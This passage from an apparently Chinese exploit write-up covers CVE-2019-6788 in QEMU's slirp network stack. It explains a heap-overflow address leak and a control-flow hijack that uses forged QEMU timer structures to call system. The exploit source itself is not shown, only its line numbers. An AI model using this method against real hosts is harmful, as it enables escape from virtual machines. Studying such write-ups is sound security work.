<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">icmp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">u_int8_t</span> icmp_type; <span class="comment">/* type of message, see below */</span></span><br><span class="line"><span class="keyword">u_int8_t</span> icmp_code; <span class="comment">/* type sub code */</span></span><br><span class="line"><span class="keyword">u_int16_t</span> icmp_cksum; <span class="comment">/* ones complement checksum of struct */</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line">u_char ih_pptr; <span class="comment">/* ICMP_PARAMPROB */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">ih_gwaddr</span>;</span> <span class="comment">/* gateway address */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ih_idseq</span> /* <span class="title">echo</span> <span class="title">datagram</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">u_int16_t</span> icd_id;</span><br><span class="line"><span class="keyword">u_int16_t</span> icd_seq;</span><br><span class="line">&#125; ih_idseq;</span><br><span class="line"><span class="keyword">u_int32_t</span> ih_void;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ICMP_UNREACH_NEEDFRAG -- Path MTU Discovery (RFC1191) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ih_pmtu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">u_int16_t</span> ipm_void;</span><br><span class="line"><span class="keyword">u_int16_t</span> ipm_nextmtu;</span><br><span class="line">&#125; ih_pmtu;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ih_rtradv</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">u_int8_t</span> irt_num_addrs;</span><br><span class="line"><span class="keyword">u_int8_t</span> irt_wpa;</span><br><span class="line"><span class="keyword">u_int16_t</span> irt_lifetime;</span><br><span class="line">&#125; ih_rtradv;</span><br><span class="line">&#125; icmp_hun;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_pptr icmp_hun.ih_pptr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_gwaddr icmp_hun.ih_gwaddr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_id icmp_hun.ih_idseq.icd_id</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_seq icmp_hun.ih_idseq.icd_seq</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_void icmp_hun.ih_void</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_pmvoid icmp_hun.ih_pmtu.ipm_void</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_nextmtu icmp_hun.ih_pmtu.ipm_nextmtu</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_num_addrs icmp_hun.ih_rtradv.irt_num_addrs</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_wpa icmp_hun.ih_rtradv.irt_wpa</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_lifetime icmp_hun.ih_rtradv.irt_lifetime</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">u_int32_t</span> its_otime;</span><br><span class="line"><span class="keyword">u_int32_t</span> its_rtime;</span><br><span class="line"><span class="keyword">u_int32_t</span> its_ttime;</span><br><span class="line">&#125; id_ts;</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">idi_ip</span>;</span></span><br><span class="line"><span class="comment">/* options and then 64 bits of data */</span></span><br><span class="line">&#125; id_ip;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">icmp_ra_addr</span> <span class="title">id_radv</span>;</span></span><br><span class="line"><span class="keyword">u_int32_t</span> id_mask;</span><br><span class="line"><span class="keyword">u_int8_t</span> id_data[<span class="number">1</span>];</span><br><span class="line">&#125; icmp_dun;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_otime icmp_dun.id_ts.its_otime</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_rtime icmp_dun.id_ts.its_rtime</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_ttime icmp_dun.id_ts.its_ttime</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_ip icmp_dun.id_ip.idi_ip</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_radv icmp_dun.id_radv</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_mask icmp_dun.id_mask</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_data icmp_dun.id_data</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>说回这里的leak方法。</p>
<ol>
<li>首先通过堆溢出覆写m_data的低位为0xb00(因为该heap所在的内存页虚拟地址为0xxx000000)，不会存在越界的问题。</li>
<li>通过任意地址写将伪造的icmp包写入到0x7fxxxb00+0x318+0x14+14处(eth报头14字节，IP报头0x14字节，m_len为0x318)</li>
<li>再来一次任意写，先connect得到so_rcv，再发送一个ICMP请求包，数据包的MF为1，其mbuf会被分配到so_rcv的后面</li>
<li>故技重施，利用so_rcv溢出到mbuf-&gt;m_data，改为0xb00+0x318+14+0x14(我们之前伪造的icmp包的位置)</li>
<li>发一个MF=0的包，触发ICMP的响应，得到伪造的icmp数据包及后面的脏数据，从而leak出text地址和heap地址。</li>
</ol>
<h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>最后劫持控制流的方法还是用QemuTimer，在bss有个全局变量<code>main_loop_tlg</code>，类型为QEMUTimerList，其成员active_timers为QEMUTimer*类型的变量，我们在堆上伪造这两个变量，覆写bss的全局变量，伪造cb为system@plt，opaque为参数地址，当expire_time过完就会触发命令执行。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000012C3900 main_loop_tlg   QEMUTimerListGroup_0 &lt;?&gt;</span><br><span class="line">.bss:00000000012C3900                                         ; DATA XREF: qemu_clock_init+28↑o</span><br><span class="line">.bss:00000000012C3900                                         ; qemu_clock_init+C0↑o ...</span><br><span class="line">.bss:00000000012C3920 ; QEMUClock_0 qemu_clocks[4]</span><br><span class="line">.bss:00000000012C3920 qemu_clocks     QEMUClock_0 4 dup(&lt;?&gt;)  ; DATA XREF: qemu_clock_ptr+11↑o</span><br><span class="line">.bss:00000000012C39A0 ; AioContext_0 *qemu_aio_context</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// util/qemu-timer.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> &#123;</span></span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;</span><br><span class="line">    QLIST_ENTRY(QEMUTimerList) <span class="built_in">list</span>;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="keyword">void</span> *notify_opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* lightweight method to mark the end of timerlist's running */</span></span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// include/qemu/timer.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="keyword">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;  <span class="comment">// 函数指针</span></span><br><span class="line">    <span class="keyword">void</span> *opaque;     <span class="comment">// 参数</span></span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="keyword">int</span> attributes;</span><br><span class="line">    <span class="keyword">int</span> scale;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="调试记录"><a href="#调试记录" class="headerlink" title="调试记录"></a>调试记录</h2><p><code>raycp</code>师傅的exp注释写的很详尽，不过中间有一些不太好理解的地方，这里记录了一下自己动态调试的过程备忘。</p>
<p>寻找地址的方法：payload里给特殊字符，gdb里find字符串定位关键数据结构。</p>
<ol>
<li>第一次堆溢出覆写m_data为0xb00</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/6.png" alt=""></p>
<ol start="2">
<li>通过任意地址写写入伪造的eth+ip+icmp包</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/8.png" alt=""></p>
<ol start="3">
<li>第二次堆溢出覆写m_data为0xb00+0x14+0x318+14的icmp伪造包处</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/9.png" alt=""></p>
<ol start="4">
<li>根据leak的数据反查内存</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/10.png" alt=""></p>
<ol start="5">
<li>对比之后确认泄露的内存恰为我们输入的伪造icmp地址处，不过在输出前做了一次拷贝</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/11.png" alt=""></p>
<ol start="6">
<li>定位有效地址</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/12.png" alt=""></p>
<ol start="7">
<li>伪造timer_list和timer</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/13.png" alt=""></p>
<p><img src="/2021/01/02/cve-2019-6788/14.png" alt=""></p>
<ol start="8">
<li>执行效果</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/7.png" alt=""></p>
<h2 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h2><p>基本就是raycp师傅的代码，需要自己调试一下fake timer_list以及改system@plt地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span 